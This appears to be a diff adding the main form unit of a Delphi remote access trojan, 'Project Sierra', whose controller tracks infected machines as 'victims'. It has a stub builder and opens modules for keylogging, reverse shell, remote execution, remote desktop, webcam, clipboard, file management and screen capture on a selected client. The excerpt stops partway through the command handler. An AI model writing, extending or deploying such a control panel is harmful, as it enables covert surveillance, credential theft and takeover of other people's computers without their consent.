@@ -1,0 +1,2236 @@
+unit FrmMain;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
+  System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.Menus, Vcl.ExtCtrls,
+  System.ImageList, Vcl.ImgList, Vcl.StdCtrls, Vcl.Samples.Spin, RzTabs,
+  Vcl.Buttons, sSpeedButton, scControls, scAdvancedPager, AdvGlassButton,
+  Vcl.TMSFNCTypes, Vcl.TMSFNCUtils, Vcl.TMSFNCGraphics, Vcl.TMSFNCGraphicsTypes,
+  Vcl.TMSFNCMapsCommonTypes, Vcl.TMSFNCCustomControl, Vcl.TMSFNCWebBrowser,
+  Vcl.TMSFNCMaps, acAlphaImageList, ncSources, acPNG, CnWaterImage, GraphClient,
+  System.Math, FrmCnc, FrmChat, FrmTTS, FrmNotepad, FrmVisitWeb, FrmMsgBox,
+  FrmRemoteExe, FrmRemoteDesktop, FrmReverseShell, System.NetEncoding,
+  FrmClipbrd, FrmRemoteScripting, FrmProcess, FrmCam, FrmKeylogger,
+  FrmFileExplorer;
+
+type
+  TConnectedUserData = class
+    Line: TncLine;
+    ID: string;
+  end;
+
+type
+  TRGBTriple = packed record
+    rgbtBlue: Byte;
+    rgbtGreen: Byte;
+    rgbtRed: Byte;
+  end;
+
+  PRGBTripleArray = ^TRGBTripleArray;
+  TRGBTripleArray = array [0 .. MaxInt div SizeOf(TRGBTriple) - 1]
+    of TRGBTriple;
+
+type
+  TForm1 = class(TForm)
+    MainMenu1: TMainMenu;
+    B1: TMenuItem;
+    S1: TMenuItem;
+    O1: TMenuItem;
+    A1: TMenuItem;
+    StatusBar1: TStatusBar;
+    PageControl1: TPageControl;
+    Offline: TTabSheet;
+    Settings: TTabSheet;
+    Builder: TTabSheet;
+    TreeView1: TTreeView;
+    PageControl2: TPageControl;
+    Networking: TTabSheet;
+    Prefrences: TTabSheet;
+    D1: TMenuItem;
+    O2: TMenuItem;
+    O3: TMenuItem;
+    G1: TMenuItem;
+    CountryFlags: TImageList;
+    SpinEdit1: TSpinEdit;
+    Label1: TLabel;
+    Label2: TLabel;
+    Edit1: TEdit;
+    Splitter2: TSplitter;
+    N2: TMenuItem;
+    E1: TMenuItem;
+    PageControl3: TPageControl;
+    Event: TTabSheet;
+    Telegram: TTabSheet;
+    Statistics: TTabSheet;
+    S2: TMenuItem;
+    T1: TMenuItem;
+    ClientPopup: TPopupMenu;
+    C1: TMenuItem;
+    S6: TMenuItem;
+    F2: TMenuItem;
+    R3: TMenuItem;
+    C10: TMenuItem;
+    MenuItem1: TMenuItem;
+    R4: TMenuItem;
+    R10: TMenuItem;
+    T2: TMenuItem;
+    C11: TMenuItem;
+    C4: TMenuItem;
+    P2: TMenuItem;
+    S8: TMenuItem;
+    MenuItem2: TMenuItem;
+    H1: TMenuItem;
+    T3: TMenuItem;
+    W3: TMenuItem;
+    A2: TMenuItem;
+    L2: TMenuItem;
+    R2: TMenuItem;
+    N3: TMenuItem;
+    N4: TMenuItem;
+    C3: TMenuItem;
+    MenuItem3: TMenuItem;
+    MenuItem4: TMenuItem;
+    P1: TMenuItem;
+    W4: TMenuItem;
+    S5: TMenuItem;
+    R7: TMenuItem;
+    E2: TMenuItem;
+    C5: TMenuItem;
+    C6: TMenuItem;
+    C7: TMenuItem;
+    F3: TMenuItem;
+    R9: TMenuItem;
+    MenuItem5: TMenuItem;
+    R6: TMenuItem;
+    B3: TMenuItem;
+    U2: TMenuItem;
+    Uninstall1: TMenuItem;
+    R1: TMenuItem;
+    R12: TMenuItem;
+    R11: TMenuItem;
+    U1: TMenuItem;
+    N5: TMenuItem;
+    L1: TMenuItem;
+    MenuItem6: TMenuItem;
+    C2: TMenuItem;
+    C8: TMenuItem;
+    CopyUsername1: TMenuItem;
+    C9: TMenuItem;
+    ListView4: TListView;
+    EventLogPopup: TPopupMenu;
+    MenuItem7: TMenuItem;
+    S3: TMenuItem;
+    S4: TMenuItem;
+    N1: TMenuItem;
+    TMSFNCMaps1: TTMSFNCMaps;
+    Panel2: TPanel;
+    Panel3: TPanel;
+    Online: TTabSheet;
+    Splitter1: TSplitter;
+    ListView2: TListView;
+    Panel1: TPanel;
+    Image1: TImage;
+    ListView1: TListView;
+    OfflinePopup: TPopupMenu;
+    O4: TMenuItem;
+    N6: TMenuItem;
+    R5: TMenuItem;
+    R8: TMenuItem;
+    N7: TMenuItem;
+    C12: TMenuItem;
+    CopyIP1: TMenuItem;
+    B2: TMenuItem;
+    MenuItem8: TMenuItem;
+    ListView3: TListView;
+    MainMenuImages: TsAlphaImageList;
+    Graph: TTabSheet;
+    CheckBox1: TCheckBox;
+    CheckBox2: TCheckBox;
+    GroupBox1: TGroupBox;
+    Button1: TButton;
+    IPBlacklist: TTabSheet;
+    GroupBox2: TGroupBox;
+    Button2: TButton;
+    Button3: TButton;
+    About: TTabSheet;
+    ServerSource: TncServerSource;
+    C13: TMenuItem;
+    Button4: TButton;
+    Button5: TButton;
+    Button6: TButton;
+    Button7: TButton;
+    CnWaterImage1: TCnWaterImage;
+    GroupBox3: TGroupBox;
+    RichEdit1: TRichEdit;
+    Button8: TButton;
+    Button9: TButton;
+    Button10: TButton;
+    Button11: TButton;
+    S7: TMenuItem;
+    Tasks: TTabSheet;
+    N8: TMenuItem;
+    PageControl4: TPageControl;
+    CMD: TTabSheet;
+    Install: TTabSheet;
+    Recovery: TTabSheet;
+    TreeView2: TTreeView;
+    Edit2: TEdit;
+    Label3: TLabel;
+    RadioButton1: TRadioButton;
+    RadioButton2: TRadioButton;
+    Edit3: TEdit;
+    Edit4: TEdit;
+    GroupBox4: TGroupBox;
+    ComboBox1: TComboBox;
+    Edit5: TEdit;
+    CheckBox3: TCheckBox;
+    Button12: TButton;
+    Button13: TButton;
+    Button14: TButton;
+    ListView5: TListView;
+    P3: TMenuItem;
+    S9: TMenuItem;
+    H2: TMenuItem;
+    procedure B1Click(Sender: TObject);
+    procedure S1Click(Sender: TObject);
+    procedure O2Click(Sender: TObject);
+    procedure O3Click(Sender: TObject);
+    procedure G1Click(Sender: TObject);
+    procedure E1Click(Sender: TObject);
+    procedure CheckBox1Click(Sender: TObject);
+    procedure Button2Click(Sender: TObject);
+    procedure Button3Click(Sender: TObject);
+    function ServerSourceHandleCommand(Sender: TObject; aLine: TncLine;
+      aCmd: Integer; const aData: TBytes; aRequiresResult: Boolean;
+      const aSenderComponent, aReceiverComponent: string): TBytes;
+    procedure ServerSourceDisconnected(Sender: TObject; aLine: TncLine);
+    procedure FormCreate(Sender: TObject);
+    procedure ListView2Click(Sender: TObject);
+    procedure MenuItem7Click(Sender: TObject);
+    procedure C13Click(Sender: TObject);
+    procedure A1Click(Sender: TObject);
+    procedure ListView2DblClick(Sender: TObject);
+    procedure C3Click(Sender: TObject);
+    procedure MenuItem3Click(Sender: TObject);
+    procedure MenuItem4Click(Sender: TObject);
+    procedure W4Click(Sender: TObject);
+    procedure S5Click(Sender: TObject);
+    procedure R7Click(Sender: TObject);
+    procedure MenuItem2Click(Sender: TObject);
+    procedure R3Click(Sender: TObject);
+    procedure C4Click(Sender: TObject);
+    procedure C11Click(Sender: TObject);
+    procedure R10Click(Sender: TObject);
+    procedure TreeView2Change(Sender: TObject; Node: TTreeNode);
+    procedure T1Click(Sender: TObject);
+    procedure P3Click(Sender: TObject);
+    procedure W3Click(Sender: TObject);
+    procedure L2Click(Sender: TObject);
+    procedure F2Click(Sender: TObject);
+  private
+    FullScreenshotBitmap: TBitmap;
+    ThisFormsVictimID: string;
+  public
+    ConnectedClients: Integer;
+    ConnectedUsers: TStringList;
+    VictimsCount: Integer;
+    OfflineCount: Integer;
+  end;
+
+var
+  Form1: TForm1;
+
+implementation
+
+{$R *.dfm}
+
+procedure SendToSelectedClient(const VictimID, Msg: string);
+var
+  I: Integer;
+  NickName: string;
+  UserData: TConnectedUserData;
+begin
+  NickName := VictimID;
+  for I := 0 to Form1.ConnectedUsers.Count - 1 do
+  begin
+    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
+    if UserData.ID = NickName then
+    begin
+      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
+      Exit;
+    end;
+  end;
+end;
+
+procedure TForm1.A1Click(Sender: TObject);
+begin
+  PageControl1.ActivePageIndex := 5;
+end;
+
+procedure TForm1.B1Click(Sender: TObject);
+begin
+  PageControl1.ActivePageIndex := 2;
+end;
+
+procedure TForm1.Button2Click(Sender: TObject);
+var
+  ListItem: TListItem;
+begin
+  if Button2.Caption = 'Start' then
+  begin
+    ServerSource.Port := SpinEdit1.Value;
+    ServerSource.Active := true;
+    StatusBar1.Panels[0].text := 'Listeneing Port: ' +
+      inttostr(SpinEdit1.Value);
+    Button2.Caption := 'Stop';
+
+    ListItem := ListView4.Items.Add;
+    ListItem.Caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
+    ListItem.SubItems.Add('Started Listeneing On Port ' +
+      inttostr(SpinEdit1.Value));
+  end
+  else
+  begin
+    StatusBar1.Panels[0].text := 'Listeneing Port: ';
+    ServerSource.Active := False;
+    Button2.Caption := 'Start';
+
+    ListItem := ListView4.Items.Add;
+    ListItem.Caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
+    ListItem.SubItems.Add('Stopped Listening On Port ' +
+      inttostr(ServerSource.Port));
+  end;
+end;
+
+procedure TForm1.Button3Click(Sender: TObject);
+begin
+  ServerSource.EncryptionKey := Edit1.text;
+end;
+
+procedure TForm1.C11Click(Sender: TObject);
+var
+  NewForm: TForm14;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm14.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Clipboard Manager | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.C13Click(Sender: TObject);
+begin
+  ListView4.Selected.Delete;
+end;
+
+procedure TForm1.C3Click(Sender: TObject);
+var
+  NewForm: TForm3;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm3.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Remote Chat | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.C4Click(Sender: TObject);
+var
+  OpenDialog: TOpenDialog;
+  bytestream: TBytesStream;
+  FileStream: TFileStream;
+  DataString: string;
+begin
+  OpenDialog := TOpenDialog.Create(nil);
+  try
+    OpenDialog.Filter := 'Image Files|*.jpg;*.jpeg;*.png';
+    if OpenDialog.Execute then
+    begin
+      FileStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
+      try
+        bytestream := TBytesStream.Create;
+        try
+          bytestream.CopyFrom(FileStream, FileStream.Size);
+          DataString := TNetEncoding.Base64.EncodeBytesToString
+            (bytestream.Memory, bytestream.Size);
+          SendToSelectedClient(ListView2.Selected.SubItems[1],
+            'ChangeWallpaper|' + DataString);
+        finally
+          bytestream.Free;
+        end;
+      finally
+        FileStream.Free;
+      end;
+    end;
+  finally
+    OpenDialog.Free;
+  end;
+end;
+
+procedure TForm1.CheckBox1Click(Sender: TObject);
+begin
+  if CheckBox1.checked then
+  begin
+    PageControl3.Width := 0;
+    Splitter2.Width := 0;
+    PageControl3.Visible := False;
+    Splitter2.Visible := False;
+  end
+  else
+  begin
+    PageControl3.Width := 980;
+    Splitter2.Width := 2;
+    PageControl3.Visible := true;
+    Splitter2.Visible := true;
+  end;
+end;
+
+procedure TForm1.E1Click(Sender: TObject);
+begin
+  if PageControl3.Pages[0].Visible then
+  begin
+    PageControl3.Pages[0].Visible := False;
+    PageControl3.Pages[0].TabVisible := False;
+  end
+  else
+  begin
+    PageControl3.Pages[0].Visible := true;
+    PageControl3.Pages[0].TabVisible := true;
+  end;
+end;
+
+function CloneGraphFrame(OriginalFrame: TFrame2; Parent: TWinControl): TFrame2;
+var
+  NewFrame: TFrame2;
+begin
+  NewFrame := TFrame2.Create(Parent);
+  NewFrame.Parent := Parent;
+
+  // Copy properties
+  NewFrame.Label3.Caption := OriginalFrame.Label3.Caption;
+  // Clone Label3 caption
+  NewFrame.Label4.Caption := OriginalFrame.Label4.Caption;
+  // Clone Label4 caption
+
+  // Copy any other properties or components as needed
+
+  Result := NewFrame;
+end;
+
+procedure TForm1.F2Click(Sender: TObject);
+var
+  NewForm: TForm21;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm21.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'File Manager | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.FormCreate(Sender: TObject);
+begin
+  ConnectedUsers := TStringList.Create;
+  VictimsCount := 0;
+
+  RichEdit1.SelAttributes.Style := [fsBold];
+  RichEdit1.SelAttributes.Style := [fsBold];
+  RichEdit1.Lines.Add('Project Sierra v1.0.0');
+  RichEdit1.SelAttributes.Style := [];
+  RichEdit1.Lines.Add('@2024 - sierra.lol');
+  RichEdit1.Lines.Add('');
+
+  RichEdit1.SelAttributes.Style := [];
+  RichEdit1.Lines.Add('Developed in:');
+  RichEdit1.Lines.Add('Server - Delphi');
+  RichEdit1.Lines.Add('Stub - Delphi');
+  RichEdit1.Lines.Add('');
+
+  RichEdit1.SelAttributes.Style := [];
+  RichEdit1.Lines.Add('Licensed to:');
+  RichEdit1.Lines.Add('Ethan');
+end;
+
+procedure TForm1.G1Click(Sender: TObject);
+begin
+  PageControl1.ActivePageIndex := 4;
+end;
+
+procedure TForm1.L2Click(Sender: TObject);
+var
+  NewForm: TForm20;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm20.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Keylogger | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.R7Click(Sender: TObject);
+var
+  NewForm: TForm8;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm8.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Remote Execute | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.ListView2Click(Sender: TObject);
+begin
+  if ListView2.Selected <> nil then
+  begin
+    SendToSelectedClient(ListView2.Selected.SubItems[1], 'GeneralInfo|');
+  end;
+end;
+
+procedure TForm1.ListView2DblClick(Sender: TObject);
+var
+  NewForm: TForm2;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+  NewTab: TTabSheet;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, exit
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form2
+  NewForm := TForm2.Create(nil);
+  try
+    // Set form properties
+    NewForm.Caption := UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+
+    // Create a new tab in PageControl3
+    NewTab := TTabSheet.Create(PageControl3);
+    NewTab.PageControl := PageControl3;
+    NewTab.Caption := UserData.ID;
+
+    // Dock the form into the new tab
+    NewForm.Parent := NewTab;
+    NewForm.Align := alClient;
+    NewForm.show;
+
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.MenuItem2Click(Sender: TObject);
+var
+  NewForm: TForm9;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm9.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'ScreenCapture | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.MenuItem3Click(Sender: TObject);
+var
+  NewForm: TForm4;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm4.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Remote TTS | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.MenuItem4Click(Sender: TObject);
+var
+  NewForm: TForm5;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm5.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Remote Notepad | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.MenuItem7Click(Sender: TObject);
+begin
+  ListView4.clear;
+end;
+
+procedure TForm1.O2Click(Sender: TObject);
+begin
+  PageControl1.ActivePageIndex := 3;
+end;
+
+procedure TForm1.O3Click(Sender: TObject);
+begin
+  PageControl1.ActivePageIndex := 0;
+end;
+
+procedure TForm1.P3Click(Sender: TObject);
+var
+  NewForm: TForm18;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  if ListView2.Selected = nil then
+  begin
+    Exit;
+  end;
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  NewForm := TForm18.Create(nil);
+  try
+    NewForm.Caption := 'Processes | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    NewForm.show;
+  except
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.R10Click(Sender: TObject);
+var
+  NewForm: TForm15;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm15.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Remote Scripting | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.R3Click(Sender: TObject);
+var
+  NewForm: TForm11;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm11.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Reverse Shell | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.S1Click(Sender: TObject);
+begin
+  PageControl1.ActivePageIndex := 1;
+end;
+
+procedure TForm1.S5Click(Sender: TObject);
+var
+  NewForm: TForm7;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm7.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Message Box | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure MoveClientToListView3(const ClientID: string);
+var
+  I: Integer;
+  ListItem: TListItem;
+begin
+  for I := Form1.ListView2.Items.Count - 1 downto 0 do
+  begin
+    if Form1.ListView2.Items[I].SubItems[1] = ClientID then
+    begin
+      // Create a new item in ListView3 and copy the caption and subitems
+      ListItem := Form1.ListView3.Items.Add;
+      ListItem.Caption := Form1.ListView2.Items[I].Caption;
+      ListItem.SubItems.AddStrings(Form1.ListView2.Items[I].SubItems);
+
+      // Change subitem 3 to "Offline" (index 2)
+      if ListItem.SubItems.Count >= 3 then
+      begin
+        ListItem.SubItems[2] := 'Offline';
+        // Set the third subitem to "Offline"
+      end;
+
+      // Delete the item from ListView2
+      Form1.ListView2.Items.Delete(I);
+      Break; // Exit loop after moving
+    end;
+  end;
+end;
+
+procedure TForm1.ServerSourceDisconnected(Sender: TObject; aLine: TncLine);
+var
+  I: Integer;
+  UserData: TConnectedUserData;
+  ClientID: string;
+  ListItem: TListItem;
+  Form: TForm;
+  TabSheet: TTabSheet;
+  TabIndex: Integer;
+begin
+  ClientID := '';
+
+  // find and remove client frm connected user list
+  for I := ConnectedUsers.Count - 1 downto 0 do
+  begin
+    UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+    if UserData.Line = aLine then
+    begin
+      ClientID := UserData.ID;
+      UserData.Free;
+      ConnectedUsers.Delete(I);
+      Break;
+    end;
+  end;
+
+  if ClientID <> '' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        // move client to offline listview
+        MoveClientToListView3(ClientID);
+
+      end);
+  end;
+  // log event
+  ListItem := ListView4.Items.Add;
+  ListItem.Caption := FormatDateTime('dd/mm/yy hh:nn', Now);
+  ListItem.SubItems.Add('Client has disconnected @' + aLine.PeerIP);
+  // update count
+  VictimsCount := ListView2.Items.Count;
+  StatusBar1.Panels[1].text := 'Online: ' + inttostr(VictimsCount);
+  OfflineCount := ListView3.Items.Count;
+  StatusBar1.Panels[2].text := 'Offline: ' + inttostr(OfflineCount);
+end;
+
+function TForm1.ServerSourceHandleCommand(Sender: TObject; aLine: TncLine;
+aCmd: Integer; const aData: TBytes; aRequiresResult: Boolean;
+const aSenderComponent, aReceiverComponent: string): TBytes;
+var
+  UserData: TConnectedUserData;
+  sl: TStringList;
+  li: TListItem;
+  ListItem: TListItem;
+  VictimID: string;
+  Reconnected: Boolean;
